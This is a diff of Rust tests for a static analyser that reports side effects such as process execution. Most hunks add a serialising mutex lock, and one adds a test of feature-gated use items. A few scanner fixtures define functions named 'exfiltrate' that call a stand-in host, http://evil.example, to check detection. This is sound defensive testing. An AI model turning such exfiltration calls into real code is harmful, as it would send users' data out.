@@ -6371,6 +6439,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -6438,6 +6507,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -6498,6 +6568,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -6572,6 +6643,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -6634,6 +6706,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -6849,6 +6922,49 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         assert!(!fixture_present(&at_ceiling, "go"),
                 "AT the reviewed ceiling the exemption must STAND — without this control the two \
                  assertions above pass for a scanner that discloses unconditionally:\n{at_ceiling:#}");
+    }
+
+    #[test]
+    fn a_use_item_under_an_inactive_feature_binds_nothing() {
+        // SOUNDNESS R140, the DECIDABLE half. `use_item_applies`'s own doc calls itself "THE ONE RULE
+        // for does this `use` item bind a name in the build we are describing" and answered only the
+        // `test` half, so a `#[cfg(feature = "mock")]` arm on a DECLARED-but-INACTIVE feature stayed in
+        // the map and competed with the real one. Which won was decided by SOURCE ORDER.
+        //
+        // BOTH ORDERS ARE ASSERTED and that is the entire point: the defect is invisible in one of
+        // them. With the real arm written first the caller read ABSENT — a purity claim over a genuine
+        // `Command::new(..).status()` — and with the two lines swapped it read `['Exec']`. A test that
+        // fixed the order would pass for the unfixed scanner half the time.
+        //
+        // The answer here is PRECISE, not hedged: the inactive arm binds nothing, so the remaining arm
+        // answers alone. That matters because the UNDECIDABLE half of R140 (`unix`/`windows`, which
+        // `cfg_eval` returns None for) is deliberately still order-dependent, held on R287's SPEC
+        // ruling — the join that would make it order-independent routes into an adjudicator SPEC §4
+        // says is wrong (union, not `Unknown` + `ambiguous:`). Do not "finish" R140 by joining here
+        // without reading R287 first.
+        //
+        // The `[features]` stanza rides in the deps slot because `scan_fixture_raw` writes
+        // `[dependencies]` and nothing else; `is_cfg_inactive` returns false outright when no features
+        // are DECLARED, so a fixture without it would pass for a scanner that never looks.
+        let feats = "\n\n[features]\ndefault = []\nmock = []\n";
+        let real_first = "\
+pub mod mockproc { pub struct Runner; impl Runner { pub fn new(_p: &str) -> Self { Runner } pub fn status(&self) -> bool { true } } }\n\
+#[cfg(not(feature = \"mock\"))] use std::process::Command as Runner;\n\
+#[cfg(feature = \"mock\")] use crate::mockproc::Runner;\n\
+pub fn run_it() -> bool { Runner::new(\"/bin/true\").status().is_ok() }\n";
+        let mock_first = "\
+pub mod mockproc { pub struct Runner; impl Runner { pub fn new(_p: &str) -> Self { Runner } pub fn status(&self) -> bool { true } } }\n\
+#[cfg(feature = \"mock\")] use crate::mockproc::Runner;\n\
+#[cfg(not(feature = \"mock\"))] use std::process::Command as Runner;\n\
+pub fn run_it() -> bool { Runner::new(\"/bin/true\").status().is_ok() }\n";
+
+        for (name, src) in [("r140real", real_first), ("r140mock", mock_first)] {
+            let v = scan_fixture_raw(name, src, feats, "");
+            assert_eq!(fixture_effects(&v, "run_it"), vec!["Exec".to_string()],
+                       "{name}: the `mock` arm is DECLARED and INACTIVE, so it binds nothing and \
+                        `Runner` is std::process::Command — the answer must be Exec and must not \
+                        depend on which of the two lines was written first:\n{v:#}");
+        }
     }
 
     #[test]
@@ -7434,6 +7550,7 @@ pub fn with_salt(a: &Argon2, pw: &[u8], salt: &[u8]) { let _ = a.hash_password_w
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -7473,6 +7590,7 @@ pub fn with_salt(a: &Argon2, pw: &[u8], salt: &[u8]) { let _ = a.hash_password_w
             "#).unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -7542,6 +7660,7 @@ pub fn with_salt(a: &Argon2, pw: &[u8], salt: &[u8]) { let _ = a.hash_password_w
             "#).unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -7618,6 +7737,7 @@ pub fn with_salt(a: &Argon2, pw: &[u8], salt: &[u8]) { let _ = a.hash_password_w
             pub fn shadowed_by_an_untypable_let() -> usize { let C = "aa"; C.len() }
             "#).unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -7694,7 +7814,8 @@ pub fn with_salt(a: &Argon2, pw: &[u8], salt: &[u8]) { let _ = a.hash_password_w
                 "[package]\nname = \"app\"\n[dependencies]\ndeplib = \"1\"\n").unwrap();
             std::fs::write(d.join("src/lib.rs"), SRC).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None,
                 ws_member: false, quiet: true, deps_idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -7788,6 +7909,7 @@ pub fn with_salt(a: &Argon2, pw: &[u8], salt: &[u8]) { let _ = a.hash_password_w
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -8638,6 +8760,7 @@ trait G {
         std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{tag}\"\n")).unwrap();
         std::fs::write(d.join("src/lib.rs"), src).unwrap();
         let idx = DepIndex::default();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: String::new(), want_json: true, include_tests: false, policy: None,
             baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -8661,6 +8784,7 @@ trait G {
         .unwrap();
         std::fs::write(d.join("src/lib.rs"), src).unwrap();
         let idx = DepIndex::default();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: String::new(), want_json: true, include_tests: false, policy: None,
             baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -9127,6 +9251,7 @@ trait G {
         )
         .unwrap();
         let idx = DepIndex::default();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: String::new(), want_json: true, include_tests: false, policy: None,
             baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -9561,6 +9686,7 @@ trait G {
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: prefix.clone(), want_json: false, include_tests: false,
             policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -9586,6 +9712,7 @@ trait G {
         let idx = load_dep_reports(None);
         let outdir = d.join("out");
         let prefix = outdir.join("r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: false, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -9647,7 +9774,8 @@ trait G {
             std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{name}\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -9691,7 +9819,8 @@ trait G {
             std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{name}\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -9736,7 +9865,8 @@ trait G {
             std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{name}\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -10076,6 +10206,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
         std::fs::write(d.join("src/lib.rs"), src).unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -10337,7 +10468,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{name}\"\n{deps}")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -10379,7 +10511,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
                 format!("[package]\nname = \"{name}\"\n[dependencies]\npnet_datalink = \"0.35\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -10438,7 +10571,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
                 format!("[package]\nname = \"{name}\"\n[dependencies]\nlibc = \"0.2\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -10545,7 +10679,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
                 "pub fn exfiltrate() {{ {name}::totally_unmodelled_tail(\"http://evil.example\"); }}\n"
             )).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -10625,6 +10760,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             "pub fn exfiltrate() { log::totally_unmodelled_tail(\"http://evil.example\"); }\n"
         ).unwrap();
         let idx = DepIndex::default();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: String::new(), want_json: true, include_tests: false, policy: None,
             baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -10673,6 +10809,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
         let base = |tag: &str| std::env::temp_dir().join(format!("candor-collide2-{tag}-{}", std::process::id()));
         let scan = |dir: &std::path::Path| -> serde_json::Value {
             let idx = DepIndex::default();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -10802,6 +10939,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
         let base = |tag: &str| std::env::temp_dir().join(format!("candor-collide3-{tag}-{}", std::process::id()));
         let scan = |dir: &std::path::Path| -> serde_json::Value {
             let idx = DepIndex::default();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -10876,6 +11014,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
     fn path_calibrated_prefix_and_reviewed_pure_impostors_lose_the_ledger_exemption() {
         let scan = |dir: &std::path::Path| -> serde_json::Value {
             let idx = DepIndex::default();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -10970,6 +11109,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
         std::fs::write(d.join("member/Cargo.toml"), "[package]\nname = \"member\"\nversion = \"0.1.0\"\n").unwrap();
         std::fs::write(d.join("member/src/lib.rs"), "pub fn noop() {}\n").unwrap();
         let idx = DepIndex::default();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: String::new(), want_json: true, include_tests: false, policy: None,
             baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -11006,7 +11146,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
                 format!("[package]\nname = \"{name}\"\n[dependencies]\nclap = \"4\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -11061,7 +11202,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
                 format!("[package]\nname = \"{name}\"\n[dependencies]\nconsole = \"0.15\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -11113,7 +11255,8 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
                 format!("[package]\nname = \"{name}\"\n[dependencies]\narboard = \"3\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -11179,6 +11322,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             None => std::env::remove_var("CANDOR_PANIC_ON_FILE"),
         }
         INCREMENTAL.with(|c| c.set(true));
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
             prefix: out.to_string(), want_json: true, include_tests: false,
             policy: Some(policy.to_string()), baseline: None, ws_member: false, quiet: true,
@@ -11483,6 +11627,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             "pub fn also_reads() { let _ = std::fs::read_to_string(\"/etc/y\"); }").unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
         std::env::set_var("CANDOR_PANIC_ON_FILE", "src/bad.rs");
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true,
             deps_idx: &DepIndex::default(), peek_excluded: false,
@@ -11690,6 +11835,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
         }
         std::fs::write(d.join("src/lib.rs"), lib).unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None,
             ws_member: false, quiet: true, deps_idx: &DepIndex::default(), peek_excluded: false,
@@ -13484,6 +13630,7 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             std::fs::write(&p, src).unwrap();
         }
         let idx = DepIndex::default();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: String::new(), want_json: true, include_tests: false, policy: None,
             baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
